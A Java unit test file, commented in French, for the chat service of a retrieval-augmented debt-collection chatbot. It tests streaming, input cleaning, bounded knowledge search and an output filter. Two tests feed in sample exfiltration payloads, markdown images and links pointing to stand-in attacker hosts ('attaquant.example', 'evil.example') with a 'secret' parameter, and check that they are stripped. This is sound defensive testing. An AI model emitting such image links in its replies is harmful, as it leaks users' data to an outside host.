package org.maksaad.recouvchatbot_rag.services;

import io.micrometer.core.instrument.simple.SimpleMeterRegistry;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.maksaad.recouvchatbot_rag.client.RecouvBackendClient;
import org.maksaad.recouvchatbot_rag.security.CallerContext;
import org.maksaad.recouvchatbot_rag.tools.BackendApiTool;
import org.springframework.ai.chat.client.ChatClient;
import org.springframework.ai.chat.messages.AssistantMessage;
import org.springframework.ai.chat.messages.UserMessage;
import org.springframework.ai.chat.model.ChatModel;
import org.springframework.ai.chat.model.ChatResponse;
import org.springframework.ai.chat.model.Generation;
import org.springframework.ai.chat.prompt.Prompt;
import org.springframework.ai.vectorstore.SearchRequest;
import org.springframework.ai.vectorstore.VectorStore;
import reactor.core.publisher.Flux;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * Comportement de ChatAiService avec un modele factice : aucun appel reseau, mais la vraie chaine
 * ChatClient / advisor de recherche / filtre de sortie.
 */
class ChatAiServiceTest {

    private static final CallerContext CALLER = new CallerContext("jeton-agent", "agent@x");

    private final AtomicReference<Prompt> lastPrompt = new AtomicReference<>();
    private List<String> modelChunks = List.of();
    private ChatAiService service;
    private VectorStore vectorStore;

    /** Modele qui repond par les morceaux prepares par le test (streaming) ou leur concatenation (appel simple). */
    private final ChatModel fakeModel = new ChatModel() {
        @Override
        public ChatResponse call(Prompt prompt) {
            lastPrompt.set(prompt);
            return response(String.join("", modelChunks));
        }

        @Override
        public Flux<ChatResponse> stream(Prompt prompt) {
            lastPrompt.set(prompt);
            return Flux.fromIterable(modelChunks).map(ChatAiServiceTest::response);
        }
    };

    private static ChatResponse response(String text) {
        return new ChatResponse(List.of(new Generation(new AssistantMessage(text))));
    }

    @BeforeEach
    void setUp() {
        vectorStore = mock(VectorStore.class);
        when(vectorStore.similaritySearch(any(SearchRequest.class))).thenReturn(List.of());
        service = new ChatAiService(ChatClient.builder(fakeModel), vectorStore,
                new BackendApiTool(mock(RecouvBackendClient.class)), 4, 0.5, new SimpleMeterRegistry());
    }

    @Test
    void laReponseArriveParMorceauxDansLOrdre() {
        modelChunks = List.of("Le délai ", "d'opposition ", "est de 15 jours.");

        List<String> received = service.stream("Délai d'opposition ?", CALLER).collectList().block();

        assertEquals("Le délai d'opposition est de 15 jours.", String.join("", received));
        assertTrue(received.size() >= 2, "la reponse est bien decoupee, pas d'un seul bloc : " + received);
    }

    /** Le point qui compte : une image piegee coupee en deux morceaux n'atteint jamais le client. */
    @Test
    void uneImageDExfiltrationEnStreamingNAtteintJamaisLeClient() {
        modelChunks = List.of("Solde : 100 DH ![](https://att", "aquant.example/?d=secret) merci.");

        List<String> received = service.stream("Solde ?", CALLER).collectList().block();

        String all = String.join("", received);
        assertFalse(all.contains("attaquant"), all);
        assertTrue(received.stream().noneMatch(d -> d.contains("![")), received.toString());
        assertEquals("Solde : 100 DH  merci.", all);
    }

    @Test
    void lAppelSimpleFiltreAussiLaSortie() {
        modelChunks = List.of("Voir [ici](https://evil.example/x) et ![](https://evil.example/p.png).");

        assertEquals("Voir ici et .", service.ragChat("Q ?", CALLER));
    }

    @Test
    void laQuestionEstNettoyeeAvantDetreEnvoyeAuModele() {
        modelChunks = List.of("ok");

        service.ragChat("Bonjour\u0000\u0007 monde", CALLER);

        String envoye = lastPrompt.get().getInstructions().stream()
                .filter(m -> m instanceof UserMessage).map(m -> m.getText()).reduce("", (a, b) -> a + b);
        assertTrue(envoye.contains("Bonjour monde") || envoye.contains("Bonjour"), envoye);
        assertFalse(envoye.contains("\u0000"));
    }

    @Test
    void laRechercheDeConnaissancesEstBorneeEtLimiteeAuScopePublic() {
        modelChunks = List.of("ok");

        service.ragChat("Question de droit ?", CALLER);

        var captor = org.mockito.ArgumentCaptor.forClass(SearchRequest.class);
        org.mockito.Mockito.verify(vectorStore).similaritySearch(captor.capture());
        SearchRequest search = captor.getValue();
        assertEquals(4, search.getTopK());
        assertEquals(0.5, search.getSimilarityThreshold());
        assertTrue(String.valueOf(search.getFilterExpression()).contains("scope"),
                "la recherche doit etre filtree sur le scope public : " + search.getFilterExpression());
    }

    @Test
    void uneErreurDuModeleEnStreamingSePropageAuControleur() {
        ChatModel enPanne = new ChatModel() {
            @Override
            public ChatResponse call(Prompt prompt) {
                throw new IllegalStateException("panne");
            }

            @Override
            public Flux<ChatResponse> stream(Prompt prompt) {
                return Flux.concat(Flux.just(response("début ")), Flux.error(new IllegalStateException("panne")));
            }
        };
        ChatAiService fragile = new ChatAiService(ChatClient.builder(enPanne), vectorStore,
                new BackendApiTool(mock(RecouvBackendClient.class)), 4, 0.5, new SimpleMeterRegistry());

        List<String> received = new ArrayList<>();
        Throwable error = org.junit.jupiter.api.Assertions.assertThrows(IllegalStateException.class,
                () -> fragile.stream("Q ?", CALLER).doOnNext(received::add).blockLast());

        // Spring AI enveloppe l'erreur du flux : la cause d'origine reste accessible.
        Throwable cause = error;
        while (cause.getCause() != null) {
            cause = cause.getCause();
        }
        assertEquals("panne", cause.getMessage());
        assertEquals("début ", String.join("", received), "ce qui a deja ete emis reste valable");
    }
}
